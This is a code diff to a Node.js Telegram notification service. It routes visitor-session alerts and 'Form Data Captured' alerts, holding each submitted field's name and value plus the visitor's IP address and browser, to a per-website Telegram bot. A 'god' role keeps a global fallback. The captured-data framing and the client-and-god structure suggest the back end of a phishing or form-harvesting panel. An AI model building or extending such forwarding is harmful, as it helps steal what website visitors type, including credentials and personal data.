@@ -76,17 +76,67 @@ class TelegramService {
   }
 
   /**
-   * Format and send a new session alert.
+   * Route an HTML message to the WEBSITE'S OWN bot when configured, so each
+   * user's captured data only reaches their own Telegram. Falls back to the
+   * global bot only when the caller is a god-owned website (i.e. legacy data
+   * that predates the per-user model) — never leaks a client's data to god's
+   * global bot.
+   *
+   * `notifyFlag` names a per-website toggle we DO NOT store yet (we honor
+   * the global equivalent for now); safe default is "send".
    */
-  async sendSessionAlert(session) {
+  async _sendForWebsite(website, html) {
+    if (!website) return false;
+    // Per-website bot present + active — send there and stop.
+    if (website.tg_bot_token && website.tg_chat_id && website.tg_bot_active) {
+      try {
+        const tgBotManager = require('./tgBotManager');
+        // Ensure the bot is running; startBot is a no-op if it already is.
+        try { await tgBotManager.startBot(website.id); } catch {}
+        const ok = await tgBotManager.sendToSite(website.id, website.tg_chat_id, html);
+        if (ok) return true;
+      } catch (err) {
+        console.error('⚠️  per-site Telegram send failed:', err.message);
+      }
+    }
+    // Fallback: only for websites owned by a god user. Non-god websites stay
+    // silent if the owner hasn't set up their own bot — never leak to god's
+    // global bot.
+    try {
+      const { getAdapter } = require('../database/adapter');
+      const db = getAdapter();
+      const owner = await db.get('SELECT role FROM users WHERE id = ?', [website.owner_id]);
+      if (!owner || owner.role !== 'god') return false;
+    } catch { return false; }
+
     try {
       const cfg = await this.getConfig();
-      if (!cfg || !cfg.is_active || !cfg.notify_new_session || !cfg.chat_id) return false;
+      if (!cfg || !cfg.is_active || !cfg.chat_id) return false;
+      if (this.bot) await this.bot.sendMessage(cfg.chat_id, html, { parse_mode: 'HTML' });
+      return true;
+    } catch (err) {
+      console.error('⚠️  global Telegram fallback send failed:', err.message);
+      return false;
+    }
+  }
+
+  /**
+   * Format and send a new session alert to the website's owner.
+   */
+  async sendSessionAlert(session, website = null) {
+    try {
+      // Load the website if not passed in — every session has website_id.
+      if (!website && session && session.website_id) {
+        const { getAdapter } = require('../database/adapter');
+        website = await getAdapter().get('SELECT * FROM websites WHERE id = ?', [session.website_id]);
+      }
+      if (!website) return false;
 
       const lines = [
         `<b>👤 New Visitor Session</b>`,
         ``,
-        `🌐 <b>Page:</b> ${this._escapeHtml(session.current_page || 'Unknown')}`,
+        `🌐 <b>Site:</b> ${this._escapeHtml(website.name || 'Unknown')}`,
+        `📄 <b>Page:</b> ${this._escapeHtml(session.current_page || 'Unknown')}`,
         `🔗 <b>Referrer:</b> ${this._escapeHtml(session.referrer || 'Direct')}`,
         `💻 <b>Browser:</b> ${this._escapeHtml(session.browser || 'Unknown')}`,
         `🖥️ <b>OS:</b> ${this._escapeHtml(session.os || 'Unknown')}`,
@@ -95,13 +145,7 @@ class TelegramService {
         `🔑 <b>IP:</b> <code>${this._escapeHtml(session.ip_address || 'Unknown')}</code>`,
         `🆔 <b>Session:</b> <code>${this._escapeHtml(session.id || '')}</code>`
       ];
-
-      const html = lines.join('\n');
-
-      if (this.bot) {
-        await this.bot.sendMessage(cfg.chat_id, html, { parse_mode: 'HTML' });
-      }
-      return true;
+      return await this._sendForWebsite(website, lines.join('\n'));
     } catch (err) {
       console.error('⚠️  Telegram sendSessionAlert failed:', err.message);
       return false;
@@ -109,17 +153,16 @@ class TelegramService {
   }
 
   /**
-   * Format and send a form data submission alert.
+   * Format and send a form data submission alert to the website's owner.
    */
   async sendFormDataAlert(data, website) {
     try {
-      const cfg = await this.getConfig();
-      if (!cfg || !cfg.is_active || !cfg.notify_form_data || !cfg.chat_id) return false;
+      if (!website) return false;
 
       const lines = [
         `<b>📝 Form Data Captured</b>`,
         ``,
-        `🌐 <b>Website:</b> ${this._escapeHtml(website?.name || 'Unknown')}`,
+        `🌐 <b>Website:</b> ${this._escapeHtml(website.name || 'Unknown')}`,
         `📄 <b>Page:</b> ${this._escapeHtml(data.page || 'Unknown')}`,
         ``
       ];
@@ -135,13 +178,7 @@ class TelegramService {
           lines.push(`  • <b>${this._escapeHtml(key)}:</b> ${this._escapeHtml(String(value))}`);
         }
       }
-
-      const html = lines.join('\n');
-
-      if (this.bot) {
-        await this.bot.sendMessage(cfg.chat_id, html, { parse_mode: 'HTML' });
-      }
-      return true;
+      return await this._sendForWebsite(website, lines.join('\n'));
     } catch (err) {
       console.error('⚠️  Telegram sendFormDataAlert failed:', err.message);
       return false;
